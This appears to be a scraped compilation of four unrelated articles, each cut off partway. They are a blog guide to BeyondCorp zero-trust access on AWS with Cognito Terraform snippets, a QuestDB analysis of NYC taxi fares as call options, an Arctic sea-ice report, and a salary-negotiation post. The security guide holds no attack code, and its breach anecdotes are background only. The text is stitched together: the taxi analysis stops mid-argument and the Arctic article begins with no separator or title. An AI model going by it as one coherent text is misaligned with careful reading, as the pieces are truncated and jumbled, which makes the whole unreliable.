<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>Internal websites. Every company has them, and they often contain some of your company’s most important data. So you should protect them to protect that data.</p><p>This isn’t a new idea, as companies have been creating VPNs (virtual private networks) to restrict access to their internal networks for decades. But once Google became wary of this approach in 2009 after the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Operation_Aurora">Operation Aurora</a> hack attempt, they decided to shift towards a zero-trust security model, where every request is treated as though it is coming from a network that could be compromised.</p><p>This gave birth to <a target="_blank" rel="noopener noreferrer" href="https://www.beyondcorp.com/">BeyondCorp</a>, a theoretical model for protecting all of your applications without the use of a VPN.</p><p>This idea has been widely praised by security researchers, though practical guides on getting started with it on the most popular cloud platforms are still limited. This is despite the fact that <a target="_blank" rel="noopener noreferrer" href="https://research.google/pubs/pub43231/">Google’s whitepaper explaining the idea</a> was released in 2014.</p><p>We get it, BeyondCorp is complex. It asks you to look at every single request flowing through your system and to validate it’s legitimacy based on multiple data sources: where is the request coming from, who is sending it, what is the security status of that source, etc. That’s a lot to ask!</p><p>But we also believe that getting started with BeyondCorp is much easier than many may think, and that the security payoffs can come immediately.</p><p>This blog post aims to provide a practical implementation guide for using BeyondCorp security on your internal websites hosted in AWS.</p><p>At Transcend, we use BeyondCorp security to ensure our IP and our users’ data stays safe.</p><h2 id="enough-buzz-words-what-would-this-look-like-as-a-user">Enough buzz words. What would this look like as a user?</h2><p>BeyondCorp is filled with buzz words. It’s zero trust. It’s perimeter-less. It’s context-aware.
That sure is a lot of cool phrases. But what does it look like in real life? Well, let’s see what happens when I go to Transcend’s internal codelabs site, where we have set up BeyondCorp authentication with our company’s GSuite credentials:</p><div>
  <p><img src="https://images.ctfassets.net/zp9m00phuodm/4t5suIga3myM4BR0tamdNg/7c40bb6aba6f5a3e231308b12f3ca960/demo.gif" alt="A GIF of a successful implementation of BeyondCorp with AWS."></p></div><p>When I attempt to load the site, it asks me to login with my GSuite credentials. Note that this includes a hardware MFA token requirement that is easily enforceable across an entire GSuite organization (and many other identity providers).
Once I gain access to the site, I won’t need to log in to any internal systems for an hour.</p><p>To see for yourself, head on over to <a target="_blank" rel="noopener noreferrer" href="https://codelabs.dev.trancsend.com/">codelabs.dev.trancsend.com</a>. While the DNS is public, only our internal employees can gain access to our internal tutorials, and you won’t be allowed in unless you have an <code>@transcend.io</code> email address.</p><p><em>Side note: You can check out some of our publicly facing tutorials at <a target="_blank" rel="noopener noreferrer" href="https://codelabs.transcend.io/">codelabs.transcend.io</a></em></p><h2 id="how-is-this-better-than-a-vpn">How is this better than a VPN?</h2><p><strong>VPNs create “eggshell” security, where all protections happen at the perimeter</strong>. Once access is gained into a system, all the data inside that network is accessible. And with the rise of remote work, cell phones, and other mobile devices, your “secure” network of trusted devices is becoming wider all the time. </p><p>In contrast, BeyondCorp encourages consistent authentication throughout all parts of an application for all devices. It doesn’t matter what device attempts to access codelabs.dev.trancsend.com, even our CEO’s laptop will need to authenticate securely before viewing the site’s contents.</p><p><strong>VPNs are an extra attack vector</strong>.  When a pentester or hacker attempts to attack your network, one very common approach is to search for vulnerabilities in any public-facing server of yours they can find.
Oftentimes, systems like VPN access points are a primary target.
<a target="_blank" rel="noopener noreferrer" href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/">Here’s a story</a> where a bug bounty hunter attacked Facebook using this approach. When he gained access to one of their internal servers, he noticed leftover files from another pentester who had used the same vulnerability to steal a small number of internal credentials.</p><p>Exploits related to CVEs (common vulnerabilities and exposures) on VPN servers are all too common, such as the time that <a target="_blank" rel="noopener noreferrer" href="https://www.zdnet.com/article/hacker-leaks-passwords-for-900-enterprise-vpn-servers/">900+ enterprise VPN servers had their passwords dumped</a>, or when a <a target="_blank" rel="noopener noreferrer" href="https://www.claroty.com/2020/07/28/vpn-security-flaws/">commonly used VPN implementation allowed for direct access to I/O devices</a>. Or the time that Lockheed Martin who (despite a solid effort to include MFA on their VPN) was <a target="_blank" rel="noopener noreferrer" href="https://www.darkreading.com/risk-management/lockheed-martin-suffers-massive-cyberattack/d/d-id/1098013">still attacked by a group who had found the random seeds used to generate tokens on their hardware MFA tokens</a>.</p><p>And if you use your company’s WiFi network as a trusted network, that network can become an attack vector as well. In 2016, the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/KRACK">KRACK vulnerability in WPA2</a> allowed attackers to find the encryption keys for all network traffic flowing through a router.</p><p>These hacks are not theoretical. They are directed and well-coordinated. When your company is successful, someone will want your data.</p><p>In contrast, BeyondCorp has no VPN. Instead of having a public-facing service that gives access to internal, hidden sites, BeyondCorp has public-facing services that request authentication information from an internal, hidden authentication server.
Because this authentication server is not exposed, it is much harder to attack.</p><p><strong>VPNs offer no guarantees over security within your network</strong></p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/7ciKFAqbRCpa2U9B0quoJJ/4957bb9dc1660cf4fc434d27e7cda6d2/NSA_Slide_Smiley.png" alt="A diagram obtained by the Washington Post that shows (with a smiley face) that traffic inside Google’s cloud did not use encryption on requests, as they saw the network perimeter as secure."></p><figcaption>Image via Washington Post.</figcaption></div><p>While your internal service #9001 may have a firewall rule saying that only server #4001 can talk to it on port 443, how does service #9001 know that the request on #4001 was not sent by an adversary who got through the VPN security? </p><p>It doesn’t in traditional architectures.</p><p>In Edward Snowden’s document dump to the Washington Post in 2013, we got to see the picture above. In it, the NSA shows (with a smiley face) that traffic inside Google’s cloud did not use encryption on requests, as they saw the network perimeter as secure.</p><p>In this case, the NSA didn’t even need to break into the perimeter. Their <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/MUSCULAR_(surveillance_program)">MUSCULAR program</a> went directly to the network infrastructure that connected Google’s (and Yahoo’s) data centers, siphoning off so much data from the fiber optic cables that the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Pinwale">NSA’s PINWALE database was overwhelmed</a>.</p><p>This attack was painfully simple. In today’s world of cloud everything, it’s important to remember that the VPN that protects your network physically exists somewhere, and that the cables that your network traffic flows through exist physically somewhere. Attackers are smart, and will make use of all vectors at their disposal.</p><p>In contrast, BeyondCorp authenticates all requests, even those inside your private networks. Services like AWS App Mesh will <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/app-mesh/latest/userguide/proxy-authorization.html">soon require that Proxy Authorization is used for all internal requests</a>. This requirement, as well as the increased ease of using TLS everywhere on service meshes, makes it far easier to enforce encryption and security for your network traffic.</p><h2 id="where-do-we-start">Where do we start?</h2><p>AWS has a few services that make implementing BeyondCorp quite manageable. If you’re getting nervous and thinking that adding application code to every single frontend and backend in your company sounds like a lot of work, have no fear—Amazon Cognito is here!</p><p><a target="_blank" rel="noopener noreferrer" href="https://aws.amazon.com/cognito/">Amazon Cognito</a> is a managed service for authentication management. It connects with many identity providers, like Google, Facebook, and Apple, while also supporting generic providers through SAML and OpenID Connect.</p><p>If you aren’t familiar with these authentication protocols, just know that it means that in the Codelabs demo from earlier, you can change the GSuite login to be login through Okta, Amazon accounts, your company’s custom auth, etc.</p><p>Cognito is a great fit for introducing BeyondCorp because it lives at the infrastructure level, and can be easily added to individual services. This makes adding BeyondCorp incrementally easy, and also means that you don’t need to make <strong>any</strong> application code changes. If you have polyglot apps written in a variety of languages and frameworks, you’re in luck: Cognito works the same way for all of them.</p><h2 id="creating-a-cognito-user-group">Creating a Cognito User Group</h2><p>The first step of this process is to create a group of people who can access your resources. With Cognito, each different group of people that should have access to a different set of resources can be made into a <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pools-user-groups.html">User Pool</a>.</p><p>To create a User Pool with <a target="_blank" rel="noopener noreferrer" href="https://www.terraform.io/">Terraform</a>, we can write:</p><div><pre><p><span>1</span><span>resource </span><span>"aws_cognito_user_pool"</span><span> </span><span>"pool"</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>name</span><span> </span><span>=</span><span> </span><span>"codelab-user-pool"</span><span></span></p><p><span>3</span><span></span><span>}</span></p></pre></div><p>The next step is to create a <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-client-apps.html">User Pool App Client</a>, which is what controls the settings for how users can authenticate to the User Pool:</p><div><pre><p><span>1</span><span>locals</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>domain</span><span>         </span><span>=</span><span> </span><span>"codelabs.dev.trancsend.com"</span><span></span></p><p><span>3</span><span>  </span><span>backend_alias</span><span>  </span><span>=</span><span> </span><span>"beyondcorp-alb.</span><span>$</span><span>{</span><span>local</span><span>.</span><span>domain</span><span>}</span><span>"</span><span></span></p><p><span>4</span><span>  </span><span>frontend_alias</span><span> </span><span>=</span><span> </span><span>"beyondcorp-cloudfront.</span><span>$</span><span>{</span><span>local</span><span>.</span><span>domain</span><span>}</span><span>"</span><span></span></p><p><span>5</span><span></span><span>}</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span></span><span>resource </span><span>"aws_cognito_user_pool_client"</span><span> </span><span>"client"</span><span> </span><span>{</span><span></span></p><p><span>8</span><span>  </span><span>name</span><span>                </span><span>=</span><span> </span><span>"codelab-user-pool-client"</span><span></span></p><p><span>9</span><span>  </span><span>user_pool_id</span><span>        </span><span>=</span><span> aws_cognito_user_pool.pool.id</span></p><p><span>10</span><span>  </span><span>generate_secret</span><span>     </span><span>=</span><span> </span><span>true</span><span></span></p><p><span>11</span><span>  </span><span>allowed_oauth_flows</span><span> </span><span>=</span><span> </span><span>[</span><span>"code"</span><span>]</span><span></span></p><p><span>12</span><span>  </span><span>callback_urls</span><span> </span><span>=</span><span> </span><span>[</span><span></span></p><p><span>13</span><span>    </span><span>"https://</span><span>$</span><span>{</span><span>local</span><span>.</span><span>backend_alias</span><span>}</span><span>/oauth2/idpresponse"</span><span>,</span></p><p><span>14</span><span>    </span><span>"https://</span><span>$</span><span>{</span><span>local</span><span>.</span><span>frontend_alias</span><span>}</span><span>"</span><span>,</span></p><p><span>15</span><span>  </span><span>]</span><span></span></p><p><span>16</span><span>  </span><span>allowed_oauth_scopes</span><span>                 </span><span>=</span><span> </span><span>[</span><span>"email"</span><span>, </span><span>"openid"</span><span>]</span><span></span></p><p><span>17</span><span>  </span><span>allowed_oauth_flows_user_pool_client</span><span> </span><span>=</span><span> </span><span>true</span><span></span></p><p><span>18</span><span>  </span><span>supported_identity_providers</span><span>         </span><span>=</span><span> </span><span>[</span><span>"COGNITO"</span><span>]</span><span></span></p><p><span>19</span><span>  </span><span>explicit_auth_flows</span><span> </span><span>=</span><span> </span><span>[</span><span></span></p><p><span>20</span><span>    </span><span>"ALLOW_CUSTOM_AUTH"</span><span>,</span></p><p><span>21</span><span>    </span><span>"ALLOW_REFRESH_TOKEN_AUTH"</span><span>,</span></p><p><span>22</span><span>    </span><span>"ALLOW_USER_SRP_AUTH"</span><span>,</span></p><p><span>23</span><span>  </span><span>]</span><span></span></p><p><span>24</span><span></span><span>}</span></p></pre></div><p>In this example, we have not enabled an Identity Provider (IdP), so only username and password auth is accepted.

October 26, 2020 | https://questdb.io/blog/2020/10/16/taxi-drivers-are-options-traders | <a href="https://web.archive.org/web/*/https://questdb.io/blog/2020/10/16/taxi-drivers-are-options-traders">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Every cab I have ever ridden has been complaining about how hard it is to make
ends meet as a driver. The public is generally quick to blame unfair competition
from the likes of Uber. However, additional forces are also to blame.</p><p>Going through more than 10 years worth of NYC taxi data, I analyse how the
antiquated meter system impacts the livelihood of NYC cabbies by drawing an
analogy with stock options trading. Interestingly, this approach allows us to
show that drivers have progressively been worse-off, independently of
competition from Uber.</p><p>In order to do so, we have loaded a dataset into our database QuestDB. This
dataset includes over 1.6 billion taxi rides, 700 million FHV rides (Uber, Lyft
etc), and 10 years of weather and gas prices data.</p><p>A few of months ago, I was putting together data for QuestDB's demo that we
shared on <a href="https://news.ycombinator.com/item?id=23616878" target="_blank" rel="noopener noreferrer">ShowHN</a>.</p><p>It has been a while since I left derivatives trading, and was not expecting to
end up writing about options pricing. Much to my surprise, the economics of a
taxi meter are very similar to options. This provides an interesting perspective
into the fate of taxi drivers.</p><h2>The economics of the taxi meter</h2><p>Most rides are priced using the
<a href="https://www1.nyc.gov/site/tlc/passengers/taxi-fare.page" target="_blank" rel="noopener noreferrer">standard meter system</a>.
The meter is a machine, which calculates the price of a ride based on inputs
such as time, speed, and distance. Additionally, it adds taxes, tolls and
surcharges depending on a variety of factors such as the route taken or the time
of the day.</p><p>Most of the driver's earnings come from the <code>fare</code>, which consists of a
<code>flat fare</code> $2.50 for entering the cab, and a <code>variable fare</code>. The variable
fare is a function of speed, time and distance. It is calculated as follows:</p><ul><li>When the cab drives above 12mph, $2.50 per mile</li><li>Otherwise, $0.50 per minute</li></ul><p>This post focuses on the variable fare, i.e the output of the meter excluding
the $2.50 start fee and extras. To be able to compare rides with one another,
we normalize it as an <code>hourly rate</code> of driving a customer around.</p><h2>Modelling variable earnings for taxi drivers</h2><p>Let's assume a cab is driving a customer at a constant speed during one hour. At
the end of the hour, the driver can expect to pocket <code>variable earnings</code> of:</p><ul><li>$30 if they drove below 12mph ($0.50 a minute)</li><li>$2.50 x their average speed if they drove above 12mph</li></ul><p>Let's plot the hourly earnings in function of speed. This instantly reminds me
of an old friend: call options!</p><img alt="A chart of call option payoff showing how cab drivers earnings increase with their average realized driving speed" src="https://questdb.io/img/blog/2020-10-16/cab-hourly-earnings-by-speed.png"><p>Rewriting the fare formula as follows, we recognize the call option formula
<code>Max(0, S-K)</code>.</p><p><code>Hourly Fare = 30 + max(0, Speed - 12)</code></p><p>Interestingly, the above notation breaks down the hourly variable fare into two
components.</p><ul><li>A <code>guaranteed</code> component <code>30</code>: whenever driving a customer, a cab will make at
least $30 an hour.</li><li>An <code>optional</code> component <code>max(0, Speed - 12)</code>: driving customers faster earns
the driver more.</li></ul><p>Graphically, the breakdown between <code>guaranteed</code> and <code>optional</code> fare components
look like the below:</p><img alt="A chart of call option payoff showing how cab drivers earnings increase with their average realized driving speed broken down between fixed and variable" src="https://questdb.io/img/blog/2020-10-16/cab-hourly-earnings-by-speed-breakdown.png"><p>There is a reason for this system. It is designed to align the interests of
drivers and riders:</p><ul><li>The <code>guaranteed</code> part makes discourages riders from making the driver wait and
ensures they are paid for their time.</li><li>The <code>optional</code> part discourages drivers from purposefully taking customers
through traffic.</li></ul><p>Let's try to quantify the value of the optional part by using options pricing
methods in order to study the incentive for drivers.</p><h2>A simple approach to options pricing</h2><p>This post isn’t meant as an essay in financial mathematics (far from it).
However, before we continue, it is useful to understand what makes options
valuable. Buying an option is like paying to play a game with a monetary payout
contingent on some <code>variable</code>.</p><p>As an example, think of a dice game. If the die value (our variable) is below 2,
you receive 0. Otherwise, you receive the difference between that value and 2.
In financial markets, the threshold of 2 is known as the <code>strike price</code> and is
denoted K.</p><p><strong>You have to pay a fee to play this game. How much are you ready to pay?</strong></p><p>To find out, we need to calculate the expected value of a game. This is easy
since we know all <code>possible outcomes</code> and their
<code>respective probabilities of occurrence</code>. We can write these in the table below:</p><table><thead><tr><th>Dice value</th><th>Probability</th><th>Payout</th><th>Weighed payout</th></tr></thead><tbody><tr><td>1</td><td>16.66%</td><td>0</td><td>0</td></tr><tr><td>2</td><td>16.66%</td><td>0</td><td>0</td></tr><tr><td>3</td><td>16.66%</td><td>1</td><td>0.1666</td></tr><tr><td>4</td><td>16.66%</td><td>2</td><td>0.3332</td></tr><tr><td>5</td><td>16.66%</td><td>3</td><td>0.4998</td></tr><tr><td>6</td><td>16.66%</td><td>4</td><td>0.6664</td></tr></tbody></table><p>By summing all the potential payouts weighed by their probability, we compute
the expected value of playing this game: $1.4494.</p><ul><li>If we pay less to play the game, we will make money over time.</li><li>If we pay more, we lose in the long run.</li></ul><p>This example shows that in its simplest form, the value of an option is equal to
the product of the payout profile and the associated probability distribution
when the option expires. Let’s visualize this by plotting the values for our
game in the following chart:</p><img alt="A chart showing the outcome profile of the dice game and the corresponding probabilities and probability-weighed expected payout values" src="https://questdb.io/img/blog/2020-10-16/die-game-payout-profile.png"><p>where:</p><ul><li>The white dashed line represents the possible (discrete) payouts for the game.</li><li>The cyan dotted line is the probability for each outcome (dice value) to
occur. It is a straight line at 16.66% since each of the 6 values is
equiprobable.</li><li>The coloured area is the product of the first two lines. Its total surface is
the value of our option.</li></ul><p>Of course, this is very simplified. I omit time value, which is the idea that
you (almost) always wish you could hold the option for longer. The reason time
value exists has to do with the asymmetric payoff profile: there is more to win
than to lose by waiting a little longer. Also, in real life, outcomes are rarely
equiprobable. For example, stock prices are represented as a log-normal
distribution. Nevertheless, this example gives a good introduction to calculate
the value of an option.</p><p>Now, since we saw that speed is the main driver behind the variable fare, we
should attempt to build a representation of speed distribution in order to
estimate the option value.</p><h2>Modelling cabs speed and option value</h2><p>This can be done using a log-normal distribution, which is analogous to the
normal distribution, but cannot be negative. This fits our situation well since
cabs can only drive above 0mph.</p><p>The log-normal distribution requires two parameters:</p><ul><li>the <code>mean</code>, i.e a driver's expected average speed for a given hour.</li><li>the <code>standard deviation</code>, a measure of how much the achieved speed is likely
to deviate from the mean.</li></ul><p>If we overlay the log-normal distribution to the option payoff, we can see the
option value below as the product of the two surface areas. As you can see, the
log-normal distribution is skewed to the left and the mode (the highest point on
the distribution, at around 10 mph) is lower than the mean (13 mph in the
above).</p><img alt="A chart of call option payoff with the corresponding probability and weighed value area as overlay" src="https://questdb.io/img/blog/2020-10-16/option-payoff-probability-value.png"><p>We can play with our two parameters to get a grasp on the pricing dynamics. Here
is how the average speed changes the distribution and expected option value:</p><img alt="A chart showing how distribution of outcomes and value change with the expected mean" src="https://questdb.io/img/blog/2020-10-16/payout-change-with-avg.png"><p>And here is the effect of standard deviation:</p><img alt="A chart showing how distribution of outcomes and value change with the standard deviation" src="https://questdb.io/img/blog/2020-10-16/payout-change-with-stdev.png"><p>We can see that a higher mean and a higher standard deviation result in higher
option value. In short, this means that it is in the drivers' best interests to</p><ul><li>drive faster;</li><li>deviate for the mean, for example by taking risks.</li></ul><p>Now, to be clear, I don't mean that they should drive recklessly, but rather
that they should attempt "risky" routes, which could either save a lot of time,
or otherwise be a disaster.</p><p>In traditional finance, the sensitivities to input parameters, which we have
introduced above are called the “Greeks”. These are measures of risk named
(mostly) after Greek letters. They are used to evaluate and manage the risk of
options portfolios. Here are the two greeks respective to the mean and standard
deviation:</p><ul><li>The <code>delta</code>, change of option value relative to change of the mean</li><li>The <code>vega</code>, change of value relative to the change of standard deviation (aka
volatility).</li></ul><p>These are "first order" greeks, which means they directly affect the option
value. There are more greeks, of higher order, which affect the option value
indirectly. As example, the <code>vanna</code> is a second-order greek which measures how
much the delta (first order greek) of an option changes when volatility changes.</p><h2>Traffic increase has cost a great amount to taxi drivers</h2><p>Let’s first look at the average speed over time.</p><p>The NYC taxi dataset gives us the distance calculated by the meter, the pickup
timestamp, and the drop-off timestamp. Using QuestDB, we can derive the duration
of each ride as the difference between the two timestamps and divide the
distance by the duration, to calculate the average speed.</p><p>With <code>SAMPLE BY</code>, I compute the average results for monthly intervals and plot
it below. Over 10 years, the average speed dropped significantly from 13.3 to
9.7mph (almost 30%!).</p><img alt="A chart showing the evolution of the average cab driver speed over time and how it consistently dropped below the threshold" src="https://questdb.io/img/blog/2020-10-16/average-speed-over-time.png"><p>This number is a simplification since it assumes constant speed and no idle
time. However, it is useful to calculate a lower-bound for earnings as follows.</p><p><code>Min Hourly Variable Fare = Max($30, Avg(speed) * $2.5)</code></p><p>Similarly, we can estimate the upper bound of a driver’s hourly earnings in a
theoretical world where drivers are either idle or accelerate instantly from 0
to the speed limit of 25mph. This is how the maximum potential fare could be
calculated:</p><p><code>Max potential hourly variable fare = Distance component + Idle component</code></p><p><code>Distance component = Average ride distance * $2.50 / Average ride duration (hours)</code></p><p>and</p><p><code>Idle component = (25 - Average ride distance)/25mph * 60min * $0.50</code></p><p>Lastly, we can calculate the actual average variable fare over time as follows.</p><p><code>Actual Hourly Variable Fare =avg(fare_amount - $2.50) / avg(duration_hours) </code></p><p>Here is what the three metrics look like over time (note we started the plot in
September 2012 since cab prices were increased in August 2012. Interestingly,
the average minimum variable fare has dropped over time and is now hitting a
floor.</p><img alt="A chart showing the evolution of the average cab driver potential fare range against the actual average fare" src="https://questdb.io/img/blog/2020-10-16/potential-average-fare-range.png"><p>Now that we have the average speed, we can use the standard deviation to model
the speed distribution. By feeding the historical mean and standard deviations
into a log-normal distribution model, we can compute the following percentiles.

<p><strong>Arctic sea ice melt season usually lasts from March till September. After reaching the minimum extent in September, sea ice starts to grow back in October. But this year, the growth is much slower than last year, with almost no growth in some places. How did this unusual situation happen and can it mean something for the weather towards Winter 2020/2021?</strong><br>
&nbsp;</p>
<h5><span><strong>THE ARCTIC ICE GROWTH</strong></span></h5>
<p>The Arctic sea ice seasonal cycle can be seen in the image below from the Arctic-ROOS system. It shows the Arctic sea ice extent change over a year. The melt season usually starts in March, after the peak ice extent is reached, lasting all the way to September. The graph shows the last few years of data, where we can see the 2020 Arctic ice extent was second-lowest, only behind 2012, which still holds the record for the lowest ice extent since measurements began.</p>

<p>But comparing 2012 and 2020, we can see that this year we are also setting a new record, as the Arctic sea ice is not recovering as expected. The sea ice is refreezing back, but at a much slower rate than normal, meaning that some areas are severely falling behind.</p>

<p>That is even more evident when we look at the comparison of all the years since the active satellite observations began in 1979. This year we observed the second-lowest Arctic sea ice extent on record. But because of the unusually low ice growth in October, the current ice extent is now the lowest for any October in the past 41 years.</p>

<p>Comparing the minimum extent dates for the past 17 years also shows the 2020 minimum to be second lowest, trailing only the grand minimum of 2012. Graphic provided by <a href="https://sites.uci.edu/zlabe/graduate-research/">Zachary Labe</a>.</p>

<p>Comparing the years by the current date, we are well the lowest for this time of year. That is also evident by the second image, which shows the sea ice anomaly, compared to the long-term average. It shows the 2020 (red area) ice extent anomaly to continue to increase, while in the previous years (white lines), the anomaly already started to decrease by this point.</p>

<p>Growth has obviously begun since mid-September, but the rate was rather weak and is not increasing with time, evident by the recent daily increase rate on the image below. At this point, the daily growth should slowly increase over time, but we can see the daily growth area is not increasing and has rather been almost decreasing over time. The second image shows the October growth compared to previous years, where 2020 is severely trailing behind</p>

<p>Images below show the current sea ice extent and thickness. We can see that the thickness shows a larger area than the concentration. That is because the concentration shows only the sea ice above 15% concentration. Anything below that means the ice is just too fractured and not compact enough.</p>
<p>So the sea ice thickness image reveals that there is thinner uncompacted ice around the edges, which falls below the 15% concentration threshold. This is usually normal because new sea ice is just starting to form on the edges and takes time to get more compact. But this year the ice is not compacting so fast, and we are now going to look at what is behind this unusual event.</p>

<h5><span><strong>THE VAST ARCTIC OCEAN</strong></span></h5>
<p>The Arctic region is in fact entirely an ocean and has no large-scale landmass. It is the smallest and shallowest of the world’s five major oceans, and also the coldest. It is also the only ocean smaller than the largest country in the world by area, Russia.</p>
<p>The image below shows the Arctic ocean, as it would look without water, revealing a very complex underwater terrain. To understand the current unusual sea ice anomalies, we need to understand the ocean where all the ice floats on. More specifically, we need to understand the state of the ocean in its eastern region, in the Kara Sea, Siberian Sea, and the Laptev Sea. The image below shows these regions in the Arctic Ocean, found on the side opposite to Greenland. The graphic is from one of the more recent Arctic Ocean <a href="https://www.researchgate.net/publication/314163132_New_constraints_on_Arctic_Ocean_Mn_stratigraphy_from_radiocarbon_dating_on_planktonic_foraminifera">studies</a>.</p>

<p>The image below is probably the most important one so far, as it shows the ocean surface temperature anomaly. It shows the ocean temperatures are currently well above normal around the entire Arctic ice sheet. Anomalies of over 2-3 degrees Celsius can be found across all the 3 critical ocean regions we mentioned above.</p>

<p>Compared to this time last year, the Atlantic side is actually colder this year, while the eastern Arctic Ocean is obviously much warmer than it was this time last year.</p>

<p>Also looking at the raw temperatures, we can see the eastern Arctic ocean is actually in positive surface temperatures, which means a low to zero chance of freezing over at this point. In normal conditions, almost the entire Arctic ocean should be at or below the freezing point – 0°C (black color) by the end of October.</p>

<p>When comparing the current ice concentration and thickness with the lowest ice extent in mid-September, we can see the growth on the edges. But towards Siberia, we can actually see a reduced concentration and reduced thickness (red colors). Ocean and air temperatures were not yet right to allow rapid refreeze towards Siberia at present time.</p>

<p>But temperature is not the only factor here. <span><strong>Ocean salinity</strong></span> also plays a big role in the production of ice. The saltier the water, the colder it needs to get for ice to form. Think of salt being used on the roads to prevent ice buildup.</p>
<p>The image below shows the Arctic ocean salinity, where we can see the fresher water in blue colors, and saltier waters in brownish hues. Transport of saltier water is obvious from the North Atlantic into the Arctic Ocean, specifically towards the eastern parts. Interestingly, we can see the dark colors around the coastal areas, which is very fresh water. That is the freshwater discharge from the Siberian rivers.</p>

<p>We produced a short but very cool high-resolution video animation, which shows the Arctic ocean salinity in the past 5 months. You can see the <span><strong>ocean circulation</strong></span>, <strong><span>ocean currents,</span></strong> and the <strong><span>saltier water transport</span></strong> from the North Atlantic. Also note the freshwater entering the Arctic from the Siberian side, as the rivers discharge into the ocean, and note the freshwater increase during Summer, as melting ice makes the surface waters fresher.</p>


<h5><span><strong>SEA ICE ACROSS REGIONS</strong></span></h5>
<p>Many regions have regained ice since the lowest point in mid-September. But as we have shown above, the east Arctic Ocean is unusually warm and prevents fast sea-ice expansion.</p>
<p>The image below shows the sea ice extent by various regions across the Arctic. While some regions normally start the freezing at a later date, there are 3 regions that stand out, as they should be much higher than they currently are. The <strong><span>Siberian Sea</span></strong> region, the <span><strong>Kara Sea</strong></span>, and the <span><strong>Laptev Sea</strong></span>. These are the regions that we have highlighted higher up in the article, which also face the biggest temperature anomalies.</p>

<p>Looking at the Siberian Arctic region, it is struggling to increase the ice extent. It is running really unusually low for this time of year, having just a few % of the normal sea ice extent expected for this date.</p>

<p>And of course, the Laptev Sea, which has been at record low levels for quite some time now. In the previous decade, the Laptev Sea has been entirely frozen over by this time of year, while this year it simply cannot lift off the ground.</p>

<p>But what is causing this unusual situation in the eastern Arctic Ocean? We have seen the ocean temperature anomalies and ocean salinity. But what has brought the Arctic Ocean into this state? Part of the answer lies in the Atmosphere, which is where we are heading next.<br>
&nbsp;</p>
<h5><span><strong>FROM THE OCEAN TO THE ATMOSPHERE</strong></span></h5>
<p>In the atmosphere, we usually always start with the temperatures. Looking at the January-September period, we can see that a hotspot has developed right over Siberia and the eastern Arctic Ocean. We can see a large area of temperatures 4-5°C above the long term average. We wrote about these <a href="https://www.severe-weather.eu/global-weather/arctic-circle-high-pressure-warming-fa/">Arctic heatwaves</a>, which were ongoing since Spring.</p>

<p>A closer look at the August-September period reveals an even stronger hotspot, now expanded further into the Arctic Ocean, as the sea ice melted and more open water was exposed to the warmer weather.</p>

<p>The reason behind this anomaly was a very specific pressure pattern. The October analysis so far, shows the high-pressure area dominating the Arctic region, while we can see a low-pressure system over the Siberian side.</p>

<p>Such a pattern creates a very unique transpolar airflow over the eastern Arctic Ocean. The image below shows the average low-level wind flow in October so far. We can see the air transport across the Arctic, as warmer air enters the Arctic from one side, and cooler air leaving out on the other side.</p>

<p>Looking at temperature anomalies in October so far, we can actually see a massive warm anomaly across the Siberian Arctic. That is where the warmer air was entering the region, replacing the colder air moving out into western Siberia.</p>

<p>The past 10 days specifically, have seen anomalies in excess of 15°C across the Siberian Arctic ocean. This, together with the warmer ocean waters, has been a large ice growth inhibitor so far in October.</p>

<p>The forecast is not looking any better. The pressure pattern has now actually reversed, with lower pressure over the Arctic. But this will change the airflow direction, just bringing warmer air from another source region. The first image shows the pressure anomalies next weekend. The second image shows the wind direction and temperature anomalies, revealing a large scale warmer air transport into the Siberian Arctic.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>TL;DR: “I’m still trying to establish whether this role is a good fit for me. Why? What is this role worth to your company?”</p><p>Reddit has been awash with posts of people getting asked for their salary history while job hunting. These posts are popping up on all sorts of subreddits. I’ve seen folks write about it in /r/personalfinance, /r/engineering, and even a bit in /r/ECE. There has been <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">a reasonable amount of ink spilled on salary negotiation online</a>, and nearly all of the advice agrees: <em>absolutely do not disclose your salary history to a prospective employer.</em> The anchoring effect of disclosing what you’re paid now naturally ties a follow-on offer to that salary.</p><p>Sorry, I slipped into manager-speak there. Let me rephrase that, in plain English. Disclosing your salary can turn a potential double digit raise when changing jobs to a few percent raise. You could leave thousands, or even <em>tens</em> of thousands of dollars on the table.</p><p>At the time of this writing, it’s still completely legal for a prospective employer to ask for salary history in <a href="https://www.hrdive.com/news/salary-history-ban-states-list/516662/">over half of the states in the USA</a>. I’m fortunate enough to live in Massachusetts, where asking for salary history has been illegal since 2018. In theory, this question isn’t a problem for me any more. In reality, it’s just changed shapes. Like a nasty cold, the question has just mutated into a new form. Instead of asking: “What is your current salary?”, prospective employers instead ask “What’s your <em>expectation</em> around salary?”</p><p>This is completely legal, but if you’re not cagey about it, you could cheerfully volunteer too much information about yourself. No law is broken if you say: “Well, I currently make <em>X dollars per year</em>, so I’d expect that plus <em>arbitrary percentage raise</em>.” Make no mistake: once you’ve given a number, it’s all over. A recruiter only hears the salary you volunteered to them. The clearest symptom of this is receiving job offers of your current salary, plus $5k or 5%.</p><p>(<strong>Note:</strong> When I say “recruiter” here, I’m referring to a recruiter or other HR professional working in-house at a company. This advice doesn’t really apply to recruiting and placement agencies. Since agency fees are based on a percentage of your salary upon getting hired, the incentives are aligned for them to ask for more money on your behalf. When you make more, they make more. Indeed, agency recruiters can be valuable information brokers. I’ve had agency recruiters tell me, completely voluntarily, that they’ve been trying to fill the position you’re discussing for six months. That’s <em>extraordinary</em> leverage for a qualified candidate.)</p><p>This potentially 